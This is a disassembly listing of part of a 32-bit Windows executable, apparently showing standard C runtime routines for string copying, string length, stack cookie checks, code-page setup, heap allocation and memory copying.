  423ebc:	mov    ebx,ecx
  423ebe:	shr    ecx,0x2
  423ec1:	jne    0x423f37
  423ec3:	mov    BYTE PTR [edi],al
  423ec5:	add    edi,0x1
  423ec8:	sub    ebx,0x1
  423ecb:	jne    0x423ec3
  423ecd:	pop    ebx
  423ece:	pop    esi
  423ecf:	mov    eax,DWORD PTR [esp+0x8]
  423ed3:	pop    edi
  423ed4:	ret    
  423ed5:	mov    DWORD PTR [edi],edx
  423ed7:	add    edi,0x4
  423eda:	sub    ecx,0x1
  423edd:	je     0x423e7e
  423edf:	mov    edx,0x7efefeff
  423ee4:	mov    eax,DWORD PTR [esi]
  423ee6:	add    edx,eax
  423ee8:	xor    eax,0xffffffff
  423eeb:	xor    eax,edx
  423eed:	mov    edx,DWORD PTR [esi]
  423eef:	add    esi,0x4
  423ef2:	test   eax,0x81010100
  423ef7:	je     0x423ed5
  423ef9:	test   dl,dl
  423efb:	je     0x423f29
  423efd:	test   dh,dh
  423eff:	je     0x423f1f
  423f01:	test   edx,0xff0000
  423f07:	je     0x423f15
  423f09:	test   edx,0xff000000
  423f0f:	jne    0x423ed5
  423f11:	mov    DWORD PTR [edi],edx
  423f13:	jmp    0x423f2d
  423f15:	and    edx,0xffff
  423f1b:	mov    DWORD PTR [edi],edx
  423f1d:	jmp    0x423f2d
  423f1f:	and    edx,0xff
  423f25:	mov    DWORD PTR [edi],edx
  423f27:	jmp    0x423f2d
  423f29:	xor    edx,edx
  423f2b:	mov    DWORD PTR [edi],edx
  423f2d:	add    edi,0x4
  423f30:	xor    eax,eax
  423f32:	sub    ecx,0x1
  423f35:	je     0x423f43
  423f37:	xor    eax,eax
  423f39:	mov    DWORD PTR [edi],eax
  423f3b:	add    edi,0x4
  423f3e:	sub    ecx,0x1
  423f41:	jne    0x423f39
  423f43:	and    ebx,0x3
  423f46:	jne    0x423ec3
  423f4c:	mov    eax,DWORD PTR [esp+0x10]
  423f50:	pop    ebx
  423f51:	pop    esi
  423f52:	pop    edi
  423f53:	ret    
  423f54:	int3   
  423f55:	int3   
  423f56:	int3   
  423f57:	int3   
  423f58:	int3   
  423f59:	int3   
  423f5a:	int3   
  423f5b:	int3   
  423f5c:	int3   
  423f5d:	int3   
  423f5e:	int3   
  423f5f:	int3   
  423f60:	mov    ecx,DWORD PTR [esp+0x4]
  423f64:	test   ecx,0x3
  423f6a:	je     0x423f90
  423f6c:	mov    al,BYTE PTR [ecx]
  423f6e:	add    ecx,0x1
  423f71:	test   al,al
  423f73:	je     0x423fc3
  423f75:	test   ecx,0x3
  423f7b:	jne    0x423f6c
  423f7d:	add    eax,0x0
  423f82:	lea    esp,[esp+0x0]
  423f89:	lea    esp,[esp+0x0]
  423f90:	mov    eax,DWORD PTR [ecx]
  423f92:	mov    edx,0x7efefeff
  423f97:	add    edx,eax
  423f99:	xor    eax,0xffffffff
  423f9c:	xor    eax,edx
  423f9e:	add    ecx,0x4
  423fa1:	test   eax,0x81010100
  423fa6:	je     0x423f90
  423fa8:	mov    eax,DWORD PTR [ecx-0x4]
  423fab:	test   al,al
  423fad:	je     0x423fe1
  423faf:	test   ah,ah
  423fb1:	je     0x423fd7
  423fb3:	test   eax,0xff0000
  423fb8:	je     0x423fcd
  423fba:	test   eax,0xff000000
  423fbf:	je     0x423fc3
  423fc1:	jmp    0x423f90
  423fc3:	lea    eax,[ecx-0x1]
  423fc6:	mov    ecx,DWORD PTR [esp+0x4]
  423fca:	sub    eax,ecx
  423fcc:	ret    
  423fcd:	lea    eax,[ecx-0x2]
  423fd0:	mov    ecx,DWORD PTR [esp+0x4]
  423fd4:	sub    eax,ecx
  423fd6:	ret    
  423fd7:	lea    eax,[ecx-0x3]
  423fda:	mov    ecx,DWORD PTR [esp+0x4]
  423fde:	sub    eax,ecx
  423fe0:	ret    
  423fe1:	lea    eax,[ecx-0x4]
  423fe4:	mov    ecx,DWORD PTR [esp+0x4]
  423fe8:	sub    eax,ecx
  423fea:	ret    
  423feb:	push   0x8
  423fed:	push   0x428590
  423ff2:	call   0x423950
  423ff7:	and    DWORD PTR [ebp-0x4],0x0
  423ffb:	push   0x0
  423ffd:	push   0x1
  423fff:	call   0x425b72
  424004:	pop    ecx
  424005:	pop    ecx
  424006:	jmp    0x42400f
  424008:	xor    eax,eax
  42400a:	inc    eax
  42400b:	ret    
  42400c:	mov    esp,DWORD PTR [ebp-0x18]
  42400f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424013:	push   0x3
  424015:	call   DWORD PTR ds:0x428068
  42401b:	int3   
  42401c:	cmp    ecx,DWORD PTR ds:0x465660
  424022:	jne    0x424025
  424024:	ret    
  424025:	jmp    0x423feb
  42402a:	movzx  eax,BYTE PTR [esp+0x4]
  42402f:	mov    cl,BYTE PTR [esp+0xc]
  424033:	test   BYTE PTR [eax+0x466161],cl
  424039:	jne    0x424057
  42403b:	cmp    DWORD PTR [esp+0x8],0x0
  424040:	je     0x424050
  424042:	movzx  eax,WORD PTR [eax*2+0x42898a]
  42404a:	and    eax,DWORD PTR [esp+0x8]
  42404e:	jmp    0x424052
  424050:	xor    eax,eax
  424052:	test   eax,eax
  424054:	jne    0x424057
  424056:	ret    
  424057:	xor    eax,eax
  424059:	inc    eax
  42405a:	ret    
  42405b:	push   0x4
  42405d:	push   0x0
  42405f:	push   DWORD PTR [esp+0xc]
  424063:	call   0x42402a
  424068:	add    esp,0xc
  42406b:	ret    
  42406c:	sub    eax,0x3a4
  424071:	je     0x424095
  424073:	sub    eax,0x4
  424076:	je     0x42408f
  424078:	sub    eax,0xd
  42407b:	je     0x424089
  42407d:	dec    eax
  42407e:	je     0x424083
  424080:	xor    eax,eax
  424082:	ret    
  424083:	mov    eax,0x404
  424088:	ret    
  424089:	mov    eax,0x412
  42408e:	ret    
  42408f:	mov    eax,0x804
  424094:	ret    
  424095:	mov    eax,0x411
  42409a:	ret    
  42409b:	push   edi
  42409c:	push   0x40
  42409e:	xor    eax,eax
  4240a0:	pop    ecx
  4240a1:	mov    edi,0x466160
  4240a6:	rep stos DWORD PTR es:[edi],eax
  4240a8:	stos   BYTE PTR es:[edi],al
  4240a9:	xor    eax,eax
  4240ab:	mov    ds:0x466264,eax
  4240b0:	mov    ds:0x46615c,eax
  4240b5:	mov    ds:0x466154,eax
  4240ba:	mov    edi,0x466270
  4240bf:	stos   DWORD PTR es:[edi],eax
  4240c0:	stos   DWORD PTR es:[edi],eax
  4240c1:	stos   DWORD PTR es:[edi],eax
  4240c2:	pop    edi
  4240c3:	ret    
  4240c4:	push   ebp
  4240c5:	mov    ebp,esp
  4240c7:	sub    esp,0x518
  4240cd:	mov    eax,ds:0x465660
  4240d2:	xor    eax,DWORD PTR [ebp+0x4]
  4240d5:	push   esi
  4240d6:	mov    DWORD PTR [ebp-0x4],eax
  4240d9:	lea    eax,[ebp-0x18]
  4240dc:	push   eax
  4240dd:	push   DWORD PTR ds:0x466264
  4240e3:	call   DWORD PTR ds:0x4280dc
  4240e9:	cmp    eax,0x1
  4240ec:	mov    esi,0x100
  4240f1:	jne    0x424204
  4240f7:	xor    eax,eax
  4240f9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424100:	inc    eax
  424101:	cmp    eax,esi
  424103:	jb     0x4240f9
  424105:	mov    al,BYTE PTR [ebp-0x12]
  424108:	test   al,al
  42410a:	mov    BYTE PTR [ebp-0x118],0x20
  424111:	je     0x424149
  424113:	push   ebx
  424114:	lea    edx,[ebp-0x11]
  424117:	push   edi
  424118:	movzx  ecx,BYTE PTR [edx]
  42411b:	movzx  eax,al
  42411e:	cmp    eax,ecx
  424120:	ja     0x42413f
  424122:	sub    ecx,eax
  424124:	inc    ecx
  424125:	mov    ebx,ecx
  424127:	shr    ecx,0x2
  42412a:	lea    edi,[ebp+eax*1-0x118]
  424131:	mov    eax,0x20202020
  424136:	rep stos DWORD PTR es:[edi],eax
  424138:	mov    ecx,ebx
  42413a:	and    ecx,0x3
  42413d:	rep stos BYTE PTR es:[edi],al
  42413f:	inc    edx
  424140:	mov    al,BYTE PTR [edx]
  424142:	inc    edx
  424143:	test   al,al
  424145:	jne    0x424118
  424147:	pop    edi
  424148:	pop    ebx
  424149:	push   0x0
  42414b:	push   DWORD PTR ds:0x466154
  424151:	lea    eax,[ebp-0x518]
  424157:	push   DWORD PTR ds:0x466264
  42415d:	push   eax
  42415e:	push   esi
  42415f:	lea    eax,[ebp-0x118]
  424165:	push   eax
  424166:	push   0x1
  424168:	call   0x426078
  42416d:	push   0x0
  42416f:	push   DWORD PTR ds:0x466264
  424175:	lea    eax,[ebp-0x218]
  42417b:	push   esi
  42417c:	push   eax
  42417d:	push   esi
  42417e:	lea    eax,[ebp-0x118]
  424184:	push   eax
  424185:	push   esi
  424186:	push   DWORD PTR ds:0x466154
  42418c:	call   0x425cbc
  424191:	push   0x0
  424193:	push   DWORD PTR ds:0x466264
  424199:	lea    eax,[ebp-0x318]
  42419f:	push   esi
  4241a0:	push   eax
  4241a1:	push   esi
  4241a2:	lea    eax,[ebp-0x118]
  4241a8:	push   eax
  4241a9:	push   0x200
  4241ae:	push   DWORD PTR ds:0x466154
  4241b4:	call   0x425cbc
  4241b9:	add    esp,0x5c
  4241bc:	xor    eax,eax
  4241be:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4241c6:	test   cl,0x1
  4241c9:	je     0x4241e1
  4241cb:	or     BYTE PTR [eax+0x466161],0x10
  4241d2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4241d9:	mov    BYTE PTR [eax+0x466280],cl
  4241df:	jmp    0x4241fd
  4241e1:	test   cl,0x2
  4241e4:	je     0x4241f6
  4241e6:	or     BYTE PTR [eax+0x466161],0x20
  4241ed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  4241f4:	jmp    0x4241d9
  4241f6:	and    BYTE PTR [eax+0x466280],0x0
  4241fd:	inc    eax
  4241fe:	cmp    eax,esi
  424200:	jb     0x4241be
  424202:	jmp    0x424248
  424204:	xor    eax,eax
  424206:	cmp    eax,0x41
  424209:	jb     0x424224
  42420b:	cmp    eax,0x5a
  42420e:	ja     0x424224
  424210:	or     BYTE PTR [eax+0x466161],0x10
  424217:	mov    cl,al
  424219:	add    cl,0x20
  42421c:	mov    BYTE PTR [eax+0x466280],cl
  424222:	jmp    0x424243
  424224:	cmp    eax,0x61
  424227:	jb     0x42423c
  424229:	cmp    eax,0x7a
  42422c:	ja     0x42423c
  42422e:	or     BYTE PTR [eax+0x466161],0x20
  424235:	mov    cl,al
  424237:	sub    cl,0x20
  42423a:	jmp    0x42421c
  42423c:	and    BYTE PTR [eax+0x466280],0x0
  424243:	inc    eax
  424244:	cmp    eax,esi
  424246:	jb     0x424206
  424248:	mov    ecx,DWORD PTR [ebp-0x4]
  42424b:	xor    ecx,DWORD PTR [ebp+0x4]
  42424e:	pop    esi
  42424f:	call   0x42401c
  424254:	leave  
  424255:	ret    
  424256:	push   ebp
  424257:	mov    ebp,esp
  424259:	sub    esp,0x1c
  42425c:	mov    eax,ds:0x465660
  424261:	xor    eax,DWORD PTR [ebp+0x4]
  424264:	push   ebx
  424265:	push   esi
  424266:	mov    esi,DWORD PTR [ebp+0x8]
  424269:	xor    ebx,ebx
  42426b:	cmp    esi,ebx
  42426d:	mov    DWORD PTR [ebp-0x4],eax
  424270:	push   edi
  424271:	je     0x4243cb
  424277:	xor    edx,edx
  424279:	xor    eax,eax
  42427b:	cmp    DWORD PTR [eax+0x465670],esi
  424281:	je     0x4242e8
  424283:	add    eax,0x30
  424286:	inc    edx
  424287:	cmp    eax,0xf0
  42428c:	jb     0x42427b
  42428e:	lea    eax,[ebp-0x1c]
  424291:	push   eax
  424292:	push   esi
  424293:	call   DWORD PTR ds:0x4280dc
  424299:	cmp    eax,0x1
  42429c:	jne    0x4243c3
  4242a2:	push   0x40
  4242a4:	xor    eax,eax
  4242a6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4242aa:	pop    ecx
  4242ab:	mov    edi,0x466160
  4242b0:	rep stos DWORD PTR es:[edi],eax
  4242b2:	stos   BYTE PTR es:[edi],al
  4242b3:	mov    DWORD PTR ds:0x466264,esi
  4242b9:	mov    DWORD PTR ds:0x466154,ebx
  4242bf:	jbe    0x4243b1
  4242c5:	cmp    BYTE PTR [ebp-0x16],0x0
  4242c9:	je     0x424389
  4242cf:	lea    ecx,[ebp-0x15]
  4242d2:	mov    dl,BYTE PTR [ecx]
  4242d4:	test   dl,dl
  4242d6:	je     0x424389
  4242dc:	movzx  eax,BYTE PTR [ecx-0x1]
  4242e0:	movzx  edx,dl
  4242e3:	jmp    0x424379
  4242e8:	push   0x40
  4242ea:	xor    eax,eax
  4242ec:	pop    ecx
  4242ed:	mov    edi,0x466160
  4242f2:	rep stos DWORD PTR es:[edi],eax
  4242f4:	lea    ecx,[edx+edx*2]
  4242f7:	shl    ecx,0x4
  4242fa:	mov    DWORD PTR [ebp-0x8],ebx
  4242fd:	stos   BYTE PTR es:[edi],al
  4242fe:	lea    ebx,[ecx+0x465680]
  424304:	mov    al,BYTE PTR [ebx]
  424306:	mov    esi,ebx
  424308:	jmp    0x424333
  42430a:	mov    dl,BYTE PTR [esi+0x1]
  42430d:	test   dl,dl
  42430f:	je     0x424337
  424311:	movzx  eax,al
  424314:	movzx  edi,dl
  424317:	cmp    eax,edi
  424319:	ja     0x42432f
  42431b:	mov    edx,DWORD PTR [ebp-0x8]
  42431e:	mov    dl,BYTE PTR [edx+0x465668]
  424324:	or     BYTE PTR [eax+0x466161],dl
  42432a:	inc    eax
  42432b:	cmp    eax,edi
  42432d:	jbe    0x424324
  42432f:	inc    esi
  424330:	inc    esi
  424331:	mov    al,BYTE PTR [esi]
  424333:	test   al,al
  424335:	jne    0x42430a
  424337:	inc    DWORD PTR [ebp-0x8]
  42433a:	add    ebx,0x8
  42433d:	cmp    DWORD PTR [ebp-0x8],0x4
  424341:	jb     0x424304
  424343:	mov    eax,DWORD PTR [ebp+0x8]
  424346:	mov    ds:0x466264,eax
  42434b:	mov    DWORD PTR ds:0x46615c,0x1
  424355:	call   0x42406c
  42435a:	lea    ecx,[ecx+0x465674]
  424360:	mov    esi,ecx
  424362:	mov    edi,0x466270
  424367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424369:	mov    ds:0x466154,eax
  42436e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42436f:	jmp    0x4243d0
  424371:	or     BYTE PTR [eax+0x466161],0x4
  424378:	inc    eax
  424379:	cmp    eax,edx
  42437b:	jbe    0x424371
  42437d:	inc    ecx
  42437e:	inc    ecx
  42437f:	cmp    BYTE PTR [ecx-0x1],0x0
  424383:	jne    0x4242d2
  424389:	xor    ecx,ecx
  42438b:	inc    ecx
  42438c:	mov    eax,ecx
  42438e:	or     BYTE PTR [eax+0x466161],0x8
  424395:	inc    eax
  424396:	cmp    eax,0xff
  42439b:	jb     0x42438e
  42439d:	mov    eax,esi
  42439f:	call   0x42406c
  4243a4:	mov    ds:0x466154,eax
  4243a9:	mov    DWORD PTR ds:0x46615c,ecx
  4243af:	jmp    0x4243b7
  4243b1:	mov    DWORD PTR ds:0x46615c,ebx
  4243b7:	xor    eax,eax
  4243b9:	mov    edi,0x466270
  4243be:	stos   DWORD PTR es:[edi],eax
  4243bf:	stos   DWORD PTR es:[edi],eax
  4243c0:	stos   DWORD PTR es:[edi],eax
  4243c1:	jmp    0x4243d0
  4243c3:	cmp    DWORD PTR ds:0x465fc4,ebx
  4243c9:	je     0x4243d9
  4243cb:	call   0x42409b
  4243d0:	call   0x4240c4
  4243d5:	xor    eax,eax
  4243d7:	jmp    0x4243dc
  4243d9:	or     eax,0xffffffff
  4243dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4243df:	xor    ecx,DWORD PTR [ebp+0x4]
  4243e2:	pop    edi
  4243e3:	pop    esi
  4243e4:	pop    ebx
  4243e5:	call   0x42401c
  4243ea:	leave  
  4243eb:	ret    
  4243ec:	push   0x14
  4243ee:	push   0x4285a0
  4243f3:	call   0x423950
  4243f8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4243fc:	push   0xd
  4243fe:	call   0x423b0f
  424403:	pop    ecx
  424404:	xor    edi,edi
  424406:	mov    DWORD PTR [ebp-0x4],edi
  424409:	mov    DWORD PTR ds:0x465fc4,edi
  42440f:	mov    eax,DWORD PTR [ebp+0x8]
  424412:	cmp    eax,0xfffffffe
  424415:	jne    0x424429
  424417:	mov    DWORD PTR ds:0x465fc4,0x1
  424421:	call   DWORD PTR ds:0x4280d8
  424427:	jmp    0x424454
  424429:	cmp    eax,0xfffffffd
  42442c:	jne    0x424440
  42442e:	mov    DWORD PTR ds:0x465fc4,0x1
  424438:	call   DWORD PTR ds:0x4280d4
  42443e:	jmp    0x424454
  424440:	cmp    eax,0xfffffffc
  424443:	jne    0x424454
  424445:	mov    DWORD PTR ds:0x465fc4,0x1
  42444f:	mov    eax,ds:0x465ff4
  424454:	mov    DWORD PTR [ebp+0x8],eax
  424457:	cmp    eax,DWORD PTR ds:0x466264
  42445d:	je     0x42451e
  424463:	mov    esi,DWORD PTR ds:0x466158
  424469:	mov    DWORD PTR [ebp-0x20],esi
  42446c:	cmp    esi,edi
  42446e:	je     0x424474
  424470:	cmp    DWORD PTR [esi],edi
  424472:	je     0x424484
  424474:	push   0x220
  424479:	call   0x424672
  42447e:	pop    ecx
  42447f:	mov    esi,eax
  424481:	mov    DWORD PTR [ebp-0x20],esi
  424484:	cmp    esi,edi
  424486:	je     0x424507
  424488:	push   DWORD PTR [ebp+0x8]
  42448b:	call   0x424256
  424490:	pop    ecx
  424491:	mov    DWORD PTR [ebp-0x1c],eax
  424494:	cmp    eax,edi
  424496:	jne    0x424507
  424498:	mov    DWORD PTR [esi],edi
  42449a:	mov    eax,ds:0x466264
  42449f:	mov    DWORD PTR [esi+0x4],eax
  4244a2:	mov    eax,ds:0x46615c
  4244a7:	mov    DWORD PTR [esi+0x8],eax
  4244aa:	mov    eax,ds:0x466154
  4244af:	mov    DWORD PTR [esi+0xc],eax
  4244b2:	xor    eax,eax
  4244b4:	mov    DWORD PTR [ebp-0x24],eax
  4244b7:	cmp    eax,0x5
  4244ba:	jge    0x4244cc
  4244bc:	mov    cx,WORD PTR [eax*2+0x466270]
  4244c4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4244c9:	inc    eax
  4244ca:	jmp    0x4244b4
  4244cc:	xor    eax,eax
  4244ce:	mov    DWORD PTR [ebp-0x24],eax
  4244d1:	cmp    eax,0x101
  4244d6:	jge    0x4244e5
  4244d8:	mov    cl,BYTE PTR [eax+0x466160]
  4244de:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4244e2:	inc    eax
  4244e3:	jmp    0x4244ce
  4244e5:	xor    eax,eax
  4244e7:	mov    DWORD PTR [ebp-0x24],eax
  4244ea:	cmp    eax,0x100
  4244ef:	jge    0x424501
  4244f1:	mov    cl,BYTE PTR [eax+0x466280]
  4244f7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  4244fe:	inc    eax
  4244ff:	jmp    0x4244e7
  424501:	mov    DWORD PTR ds:0x466158,esi
  424507:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42450b:	jne    0x424521
  42450d:	cmp    esi,DWORD PTR ds:0x466158
  424513:	je     0x424521
  424515:	push   esi
  424516:	call   0x42455a
  42451b:	pop    ecx
  42451c:	jmp    0x424521
  42451e:	mov    DWORD PTR [ebp-0x1c],edi
  424521:	or     DWORD PTR [ebp-0x4],0xffffffff
  424525:	call   0x424533
  42452a:	mov    eax,DWORD PTR [ebp-0x1c]
  42452d:	call   0x42398b
  424532:	ret    
  424533:	push   0xd
  424535:	call   0x423a7b
  42453a:	pop    ecx
  42453b:	ret    
  42453c:	cmp    DWORD PTR ds:0x4664ac,0x0
  424543:	jne    0x424557
  424545:	push   0xfffffffd
  424547:	call   0x4243ec
  42454c:	pop    ecx
  42454d:	mov    DWORD PTR ds:0x4664ac,0x1
  424557:	xor    eax,eax
  424559:	ret    
  42455a:	push   0xc
  42455c:	push   0x4285b0
  424561:	call   0x423950
  424566:	mov    esi,DWORD PTR [ebp+0x8]
  424569:	test   esi,esi
  42456b:	je     0x4245c5
  42456d:	cmp    DWORD PTR ds:0x466384,0x3
  424574:	jne    0x4245b6
  424576:	push   0x4
  424578:	call   0x423b0f
  42457d:	pop    ecx
  42457e:	and    DWORD PTR [ebp-0x4],0x0
  424582:	push   esi
  424583:	call   0x424d32
  424588:	pop    ecx
  424589:	mov    DWORD PTR [ebp-0x1c],eax
  42458c:	test   eax,eax
  42458e:	je     0x424599
  424590:	push   esi
  424591:	push   eax
  424592:	call   0x424d5d
  424597:	pop    ecx
  424598:	pop    ecx
  424599:	or     DWORD PTR [ebp-0x4],0xffffffff
  42459d:	call   0x4245ad
  4245a2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4245a6:	jne    0x4245c5
  4245a8:	push   DWORD PTR [ebp+0x8]
  4245ab:	jmp    0x4245b7
  4245ad:	push   0x4
  4245af:	call   0x423a7b
  4245b4:	pop    ecx
  4245b5:	ret    
  4245b6:	push   esi
  4245b7:	push   0x0
  4245b9:	push   DWORD PTR ds:0x466380
  4245bf:	call   DWORD PTR ds:0x4280c4
  4245c5:	call   0x42398b
  4245ca:	ret    
  4245cb:	push   0xc
  4245cd:	push   0x4285c0
  4245d2:	call   0x423950
  4245d7:	mov    esi,DWORD PTR [ebp+0x8]
  4245da:	cmp    DWORD PTR ds:0x466384,0x3
  4245e1:	jne    0x424611
  4245e3:	cmp    esi,DWORD PTR ds:0x466144
  4245e9:	ja     0x424611
  4245eb:	push   0x4
  4245ed:	call   0x423b0f
  4245f2:	pop    ecx
  4245f3:	and    DWORD PTR [ebp-0x4],0x0
  4245f7:	push   esi
  4245f8:	call   0x425511
  4245fd:	pop    ecx
  4245fe:	mov    DWORD PTR [ebp-0x1c],eax
  424601:	or     DWORD PTR [ebp-0x4],0xffffffff
  424605:	call   0x42463d
  42460a:	mov    eax,DWORD PTR [ebp-0x1c]
  42460d:	test   eax,eax
  42460f:	jne    0x424634
  424611:	test   esi,esi
  424613:	jne    0x424616
  424615:	inc    esi
  424616:	cmp    DWORD PTR ds:0x466384,0x1
  42461d:	je     0x424625
  42461f:	add    esi,0xf
  424622:	and    esi,0xfffffff0
  424625:	push   esi
  424626:	push   0x0
  424628:	push   DWORD PTR ds:0x466380
  42462e:	call   DWORD PTR ds:0x428030
  424634:	call   0x42398b
  424639:	ret    
  42463a:	mov    esi,DWORD PTR [ebp+0x8]
  42463d:	push   0x4
  42463f:	call   0x423a7b
  424644:	pop    ecx
  424645:	ret    
  424646:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42464b:	ja     0x42466f
  42464d:	push   DWORD PTR [esp+0x4]
  424651:	call   0x4245cb
  424656:	test   eax,eax
  424658:	pop    ecx
  424659:	jne    0x424671
  42465b:	cmp    DWORD PTR [esp+0x8],eax
  42465f:	je     0x424671
  424661:	push   DWORD PTR [esp+0x4]
  424665:	call   0x426232
  42466a:	test   eax,eax
  42466c:	pop    ecx
  42466d:	jne    0x42464d
  42466f:	xor    eax,eax
  424671:	ret    
  424672:	push   DWORD PTR ds:0x466008
  424678:	push   DWORD PTR [esp+0x8]
  42467c:	call   0x424646
  424681:	pop    ecx
  424682:	pop    ecx
  424683:	ret    
  424684:	int3   
  424685:	int3   
  424686:	int3   
  424687:	int3   
  424688:	int3   
  424689:	int3   
  42468a:	int3   
  42468b:	int3   
  42468c:	int3   
  42468d:	int3   
  42468e:	int3   
  42468f:	int3   
  424690:	push   ebp
  424691:	mov    ebp,esp
  424693:	push   edi
  424694:	push   esi
  424695:	mov    esi,DWORD PTR [ebp+0xc]
  424698:	mov    ecx,DWORD PTR [ebp+0x10]
  42469b:	mov    edi,DWORD PTR [ebp+0x8]
  42469e:	mov    eax,ecx
  4246a0:	mov    edx,ecx
  4246a2:	add    eax,esi
  4246a4:	cmp    edi,esi
  4246a6:	jbe    0x4246b0
  4246a8:	cmp    edi,eax
  4246aa:	jb     0x42482c
  4246b0:	test   edi,0x3
  4246b6:	jne    0x4246cc
  4246b8:	shr    ecx,0x2
  4246bb:	and    edx,0x3
  4246be:	cmp    ecx,0x8
  4246c1:	jb     0x4246ec
  4246c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c5:	jmp    DWORD PTR [edx*4+0x4247dc]
  4246cc:	mov    eax,edi
  4246ce:	mov    edx,0x3
  4246d3:	sub    ecx,0x4
  4246d6:	jb     0x4246e4
  4246d8:	and    eax,0x3
  4246db:	add    ecx,eax
  4246dd:	jmp    DWORD PTR [eax*4+0x4246f0]
  4246e4:	jmp    DWORD PTR [ecx*4+0x4247ec]
  4246eb:	nop
  4246ec:	jmp    DWORD PTR [ecx*4+0x424770]
  4246f3:	nop
  4246f4:	add    BYTE PTR [edi+0x42],al
  4246f7:	add    BYTE PTR [edi+eax*2],ch
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [eax+0x47],dl
  4246fe:	inc    edx
  4246ff:	add    BYTE PTR [ebx],ah
  424701:	ror    DWORD PTR [edx-0x75f877fa],1
  424707:	inc    esi
  424708:	add    DWORD PTR [eax+0x468a0147],ecx
  42470e:	add    al,cl
  424710:	jmp    0x289cf17
  424715:	add    esi,0x3
  424718:	add    edi,0x3
  42471b:	cmp    ecx,0x8
  42471e:	jb     0x4246ec
  424720:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424722:	jmp    DWORD PTR [edx*4+0x4247dc]
  424729:	lea    ecx,[ecx+0x0]
  42472c:	and    edx,ecx
  42472e:	mov    al,BYTE PTR [esi]
  424730:	mov    BYTE PTR [edi],al
  424732:	mov    al,BYTE PTR [esi+0x1]
  424735:	shr    ecx,0x2
  424738:	mov    BYTE PTR [edi+0x1],al
  42473b:	add    esi,0x2
  42473e:	add    edi,0x2
  424741:	cmp    ecx,0x8
  424744:	jb     0x4246ec
  424746:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424748:	jmp    DWORD PTR [edx*4+0x4247dc]
  42474f:	nop
  424750:	and    edx,ecx
  424752:	mov    al,BYTE PTR [esi]
  424754:	mov    BYTE PTR [edi],al
  424756:	add    esi,0x1
  424759:	shr    ecx,0x2
  42475c:	add    edi,0x1
  42475f:	cmp    ecx,0x8
  424762:	jb     0x4246ec
  424764:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424766:	jmp    DWORD PTR [edx*4+0x4247dc]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	rol    DWORD PTR [edi+0x42],cl
  424773:	add    al,al
  424775:	inc    edi
  424776:	inc    edx
  424777:	add    BYTE PTR [eax-0x4fffbdb9],bh
  42477d:	inc    edi
  42477e:	inc    edx
  42477f:	add    BYTE PTR [eax-0x5fffbdb9],ch
  424785:	inc    edi
  424786:	inc    edx
  424787:	add    BYTE PTR [eax-0x6fffbdb9],bl
  42478d:	inc    edi
  42478e:	inc    edx
  42478f:	add    BYTE PTR [ebx-0x761b71bc],cl
  424795:	inc    esp
  424796:	(bad)  
  424797:	in     al,0x8b
  424799:	inc    esp
  42479a:	mov    gs,eax
  42479c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4247a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4247a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4247a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4247ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4247b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4247b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4247b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4247bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4247c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4247c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4247c8:	lea    eax,[ecx*4+0x0]
  4247cf:	add    esi,eax
  4247d1:	add    edi,eax
  4247d3:	jmp    DWORD PTR [edx*4+0x4247dc]
  4247da:	mov    edi,edi
  4247dc:	in     al,dx
  4247dd:	inc    edi
  4247de:	inc    edx
  4247df:	add    ah,dh
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],al
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax+ecx*2],dl
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4247f1:	leave  
  4247f2:	ret    
  4247f3:	nop
  4247f4:	mov    al,BYTE PTR [esi]
  4247f6:	mov    BYTE PTR [edi],al
  4247f8:	mov    eax,DWORD PTR [ebp+0x8]
  4247fb:	pop    esi
  4247fc:	pop    edi
  4247fd:	leave  
  4247fe:	ret    
  4247ff:	nop
  424800:	mov    al,BYTE PTR [esi]
  424802:	mov    BYTE PTR [edi],al
  424804:	mov    al,BYTE PTR [esi+0x1]
  424807:	mov    BYTE PTR [edi+0x1],al
  42480a:	mov    eax,DWORD PTR [ebp+0x8]
  42480d:	pop    esi
  42480e:	pop    edi
  42480f:	leave  
  424810:	ret    
  424811:	lea    ecx,[ecx+0x0]
  424814:	mov    al,BYTE PTR [esi]
  424816:	mov    BYTE PTR [edi],al
  424818:	mov    al,BYTE PTR [esi+0x1]
  42481b:	mov    BYTE PTR [edi+0x1],al
  42481e:	mov    al,BYTE PTR [esi+0x2]
  424821:	mov    BYTE PTR [edi+0x2],al
  424824:	mov    eax,DWORD PTR [ebp+0x8]
  424827:	pop    esi
  424828:	pop    edi
